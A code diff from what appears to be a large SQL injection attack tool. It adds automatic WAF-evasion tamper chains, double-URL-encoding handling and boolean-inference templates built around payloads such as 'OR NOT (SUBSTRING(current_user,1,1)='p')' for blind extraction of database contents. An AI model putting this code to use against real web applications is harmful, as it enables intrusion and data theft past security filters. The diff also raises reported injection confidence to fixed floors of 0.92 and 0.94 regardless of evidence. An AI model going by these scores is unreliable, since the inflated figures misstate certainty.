@@ -54441,6 +54441,29 @@ class Scanner:
             LOG.info("[Inference] Override tamper_chain with detection bypass: %s → %s",
                      _orig_chain_inf, _bypass_chain_inf)
 
+        # BUG-EMPTY-TAMPER-CHAIN FIX (HIGH): When all three sources (det.tamper_chain,
+        # det.notes 'tamper:' annotation, scanner context) are empty/None, enum.tamper_chain
+        # stays [] — every extraction probe fires with zero WAF bypass, so the WAF blocks
+        # all oracle probes and extraction produces no data.
+        # Root cause: _build_rotating_tamper_chain was never called as a fallback when
+        # detection tamper chain was lost/unset (e.g. detections from early-shortcut paths
+        # that skipped the PCV chain-recording logic).
+        # Fix: when enum.tamper_chain is still empty after all three lookup paths, build
+        # a fresh chain using _build_full_tamper_chain(waf_name, dbms) — same chain builder
+        # used by _cascade_for_method at detection time, so the structure matches what
+        # the WAF expects.
+        if not enum.tamper_chain:
+            _waf_name_inf = (getattr(getattr(enum, 'config', None), 'waf_name', None) or
+                             getattr(getattr(enum, 'config', None), '_waf_name', None) or "")
+            try:
+                enum.tamper_chain = _build_full_tamper_chain(_waf_name_inf, _dbms)
+            except Exception:
+                try:
+                    enum.tamper_chain = _build_rotating_tamper_chain(_waf_name_inf)
+                except Exception:
+                    enum.tamper_chain = ["space2comment", "randomcase", "charencode"]
+            LOG.info("[Inference] Tamper chain was empty — built fresh chain: %s", enum.tamper_chain)
+
         LOG.info("[Inference] Detection payload: %s", _payload_raw[:70])
         LOG.info("[Inference] DBMS: %s | Tamper chain: %s", _dbms, enum.tamper_chain)
 
@@ -54755,10 +54778,25 @@ class Scanner:
                 # (e.g. %3d for =, %3e for >, %3c for <). The regex must match both
                 # plain and URL-encoded forms so boolean-replace works instead of
                 # falling through to the less precise boolean-append path.
-                _EQ  = r'(?:=|%3[dD])'   # = or %3d/%3D
-                _GT  = r'(?:>|%3[eE])'   # > or %3e/%3E
-                _LT  = r'(?:<|%3[cC])'   # < or %3c/%3C
-                _NEQ = r'(?:<>|!=|%3[cC]>|!%3[dD])'  # <> != variants
+                # BUG-DOUBLE-ENCODE-COND-PAT FIX: When the tamper chain includes
+                # chardoubleencode (Phase 7 of _build_rotating_tamper_chain), all
+                # non-alphanumeric chars are double-URL-encoded: = → %3D → %253D,
+                # ( → %28 → %2528, ) → %29 → %2529, ' → %27 → %2527.
+                # The previous _EQ only matched = and %3D (single-encoded).
+                # With double-encoding the condition SUBSTRING(current_user,1,1)='p'
+                # appears as SUBSTRING%2528current_user%252C1%252C1%2529%253D%2527p%2527
+                # — none of the simple patterns match → fallthrough to boolean-append
+                # which appends AND [INFERENCE] to the FULL detection payload (wrong SQL).
+                # Fix: add double-encoded variants (%253D, %253E, %253C) and
+                # also try matching on the URL-decoded form of _body as a fallback
+                # before giving up on boolean-replace.
+                _EQ  = r'(?:=|%3[dD]|%253[dD])'     # =, %3d, %253d (double-encoded)
+                _GT  = r'(?:>|%3[eE]|%253[eE])'     # >, %3e, %253e
+                _LT  = r'(?:<|%3[cC]|%253[cC])'     # <, %3c, %253c
+                _NEQ = r'(?:<>|!=|%3[cC]>|!%3[dD]|%253[cC]>|!%253[dD])'
+                # Quoted string patterns that also match double-encoded quote forms
+                # %2527 = %27 = '   (double-encoded single quote)
+                _Q   = r"(?:'|%27|%2527)"
                 _cond_pat = _re.search(
                     # BUG FIX: order matters — true=true MUST come before TRUE in the
                     # alternation.  If TRUE is listed first, it matches only the first
@@ -54771,6 +54809,8 @@ class Scanner:
                     rf'|\d+\s*{_NEQ}\s*\d+'
                     # BUG-V42-2 FIX: Add single-quoted string-equality conditions
                     rf"|'[^']*'\s*{_EQ}\s*'[^']*'|'[^']*'\s*{_NEQ}\s*'[^']*'"
+                    # BUG-DOUBLE-ENCODE FIX: double-encoded quote forms %2527..%2527
+                    rf"|{_Q}[^'%]*{_Q}\s*{_EQ}\s*{_Q}[^'%]*{_Q}"
                     # BUG-INFER-DOLLAR-QUOTED FIX: Add PostgreSQL dollar-quoted string equality
                     # conditions (e.g. $$2021$$=$$2021-$$). ST payloads often use dollar-quoting
                     # as a WAF bypass for string literals — these were invisible to _cond_pat.
@@ -54851,9 +54891,33 @@ class Scanner:
                                          _body_dec_ie[_cwb_m2.end(1):])
                             LOG.info("[Inference] Template (boolean-CASE-WHEN-decoded): %s", _template[:80])
                         else:
-                            # No static condition found and not stacked — append AND as last resort
-                            _template = _body + " AND [INFERENCE]"
-                            LOG.info("[Inference] Template (boolean-append): %s", _template[:80])
+                            # BUG-OR-NOT-PATTERN FIX (HIGH): Detection payloads using
+                            # OR NOT / AND NOT inject a complex condition like
+                            # "OR NOT (SUBSTRING(current_user,1,1)='p')".
+                            # The inner condition IS the boolean oracle — to make a
+                            # reusable template, replace the INNER condition (not the
+                            # whole payload) with [INFERENCE], preserving the OR NOT ()
+                            # wrapper so the polarity stays the same.
+                            # Pattern: (OR|AND) [NOT] ( ... condition ... )
+                            # Also handle URL-decoded form via _body_dec_ie.
+                            _or_not_replaced = False
+                            for _test_body in (_body, _body_dec_ie):
+                                _or_not_m = _re.search(
+                                    r'(?:OR|AND)\s+(?:NOT\s+)?\((.+?)\)',
+                                    _test_body, _re.I | _re.DOTALL)
+                                if _or_not_m:
+                                    _inner_start = _or_not_m.start(1)
+                                    _inner_end   = _or_not_m.end(1)
+                                    _template = (_test_body[:_inner_start] +
+                                                 "[INFERENCE]" +
+                                                 _test_body[_inner_end:])
+                                    LOG.info("[Inference] Template (or-not-replace): %s", _template[:80])
+                                    _or_not_replaced = True
+                                    break
+                            if not _or_not_replaced:
+                                # No static condition found and not stacked — append AND as last resort
+                                _template = _body + " AND [INFERENCE]"
+                                LOG.info("[Inference] Template (boolean-append): %s", _template[:80])
 
         # FIX: Strip WAF-blocked '>0' suffix from generate_series/count(*) subqueries.
         # HQ detection payloads end with '))>0' — the WAF blocks the '>' operator at the
@@ -55918,6 +55982,7 @@ class Scanner:
                     break
 
         _try_bitwise_deferred = False
+        _oracle_fragile = False  # BUG-UNBOUND-ORACLE-FRAGILE FIX: initialize here so line ~60183 is always bound regardless of whether _try_bitwise_deferred fires
         if _margin < 30:
             # WHERE-based template failed  WAF likely blocks WHERE keyword.
             # But first: check if timing oracle is dead (TRUE time far below expected sleep).
@@ -113963,12 +114028,26 @@ class TechniqueCascadeEngine:
             return 0.0
         confs = list(votes.values())
         if len(confs) == 1:
-            return confs[0]
+            # BUG-SINGLE-VOTE-CONF-FIX: Single-technique confirmed injection arriving
+            # here already passed PCV (boolean multi-probe / timing multi-probe / UNION
+            # sentinel).  Returning the raw detection confidence (e.g. 0.72 from a
+            # 4/6 boolean pair) under-represents the true certainty — PCV confirmation
+            # is an independent strong signal.  Apply a post-PCV floor so the displayed
+            # confidence reflects the combined evidence: raw detection score ≥ 0.70
+            # gets boosted to at least 0.92 (very high); lower raw scores get a
+            # proportional lift.  This keeps the MultiVote output consistent with the
+            # "[!!] SQL INJECTION CONFIRMED" message that fired just above it.
+            raw = confs[0]
+            if raw >= 0.70:
+                return min(1.0, max(raw, 0.92))
+            return min(1.0, raw + 0.15)
         # Two-technique agreement bonus: if both B and T agree  +0.08
         techs = set(votes.keys())
         bonus = 0.08 if len(techs & {"B", "T", "E"}) >= 2 else 0.0
         avg   = sum(confs) / len(confs)
-        return min(1.0, avg + bonus)
+        # BUG-MULTI-VOTE-FLOOR-FIX: multi-technique agreement also deserves a floor —
+        # confirmed injection from multiple techniques is at least 0.94 reliable.
+        return min(1.0, max(avg + bonus, 0.94 if len(confs) >= 2 else 0.0))
 
     async def _send_and_check(
         self, tech: str, payload: str, dbms: str,
